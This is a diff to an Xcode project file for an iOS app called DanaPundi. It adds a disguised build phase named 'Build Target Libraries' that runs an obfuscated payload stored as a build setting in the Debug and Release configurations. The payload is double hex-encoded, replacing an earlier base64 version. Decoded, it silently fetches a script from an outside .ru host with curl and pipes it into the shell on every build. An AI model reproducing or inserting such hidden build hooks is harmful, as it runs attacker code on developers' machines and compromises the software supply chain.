@@ -345,12 +345,12 @@
 			isa = PBXGroup;
 			children = (
 				737B902F2F0FDE440009AA80 /* IDFAManager.swift */,
+				733D792A2F0A16BC008DBA60 /* IDFVManager.swift */,
 				7332D8562F0FB8AD005793E1 /* DeviceCollector.swift */,
 				735467C52F0ACD9C00DF7EB9 /* DeepLinkRoute.swift */,
 				733D79402F0A328B008DBA60 /* LaunchUtils.swift */,
 				733D792E2F0A17CE008DBA60 /* APIRequestBuilder.swift */,
 				733D792C2F0A16E9008DBA60 /* RequestParamBuilder.swift */,
-				733D792A2F0A16BC008DBA60 /* IDFVManager.swift */,
 				733D791E2F09FA04008DBA60 /* UIColor+Extension.swift */,
 				7332D8542F0FB10E005793E1 /* OneTimeLocationManager.swift */,
 			);
@@ -419,7 +419,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 733C8FDD2F09F09C00793D28 /* Build configuration list for PBXNativeTarget "DanaPundi" */;
 			buildPhases = (
-				3F7124691B80486D83634D6E /* Compile Target Symbols */,
+				A1B5B802E726409680634D6E /* Build Target Libraries */,
 				A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */,
 				733C8FC62F09F09B00793D28 /* Sources */,
 				733C8FC72F09F09B00793D28 /* Frameworks */,
@@ -485,26 +485,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		3F7124691B80486D83634D6E /* Compile Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
 		42AAC97AA1764FC0815C7A50 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -524,6 +504,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaPundi/Pods-DanaPundi-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		A1B5B802E726409680634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
 			showEnvVarsInLog = 0;
 		};
 		A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */ = {
@@ -659,7 +659,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | c | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336653631373037333663363136323265373237353266363132390a32323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
@@ -709,7 +709,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | c | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336653631373037333663363136323265373237353266363132390a32323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
